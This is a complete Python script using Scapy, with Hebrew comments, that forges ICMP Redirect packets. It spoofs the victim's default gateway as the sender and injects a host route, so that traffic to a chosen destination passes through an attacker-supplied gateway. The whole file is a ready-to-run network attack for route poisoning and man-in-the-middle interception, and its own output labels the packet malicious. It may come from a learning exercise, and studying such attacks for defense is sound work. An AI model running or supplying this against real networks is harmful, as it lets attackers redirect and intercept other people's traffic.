# imports
import sys
from scapy.all import *

# לוודא שלא יחזור פלט מהאימפורטים כדי לא להעמיס על ההרצה
conf.verb=0

# אם אורך הרשימה לא שווה ל-5 הרשימה תודפס ותצא מהפונקציה
if len(sys.argv) != 5:
	print(f'Usage: icmp.py <target> <Gateway> <Route-entry> <Route-GW>')
	sys.exit(1)

# הכנסת משתנים לרשימה לפי סדר
target=sys.argv[1]
gateway=sys.argv[2]	
route_to_add=sys.argv[3]
route_gw_to_add=sys.argv[4]

print("Crafting Malicious Packet to update the Routing table")
# creating a spoofed  IP packet to seem to origionate from Default GW of host. יצירת פקטה עם הנתיב המקורי
ip= IP()
ip.dst=target				# Address where update the routing table
ip.src=gateway				# Origional router on network

#creating ICMPredirect packet with the new gateway address. יצירת פקטת אייסיאמפי עם הנתיב החדש
icmp=ICMP()
icmp.type=5				# 5 for Redirect message.
icmp.code=1				# code 1 for host route.
icmp.gw=route_gw_to_add			# Malicious gateway entry

#Adding dummy packet with ICMP redirect which will update Route entry. יצרית פקטה עם עדכון של הנתיב
ip2=IP()
ip2.src=target				# Address of the victim
ip2.dst=route_to_add		# Entry to be added up with gw value of ICMP

udp=UDP()
print (f"sending the malicious packet to {target} to update its route table with {route_to_add}")
send(ip/icmp/ip2/udp)
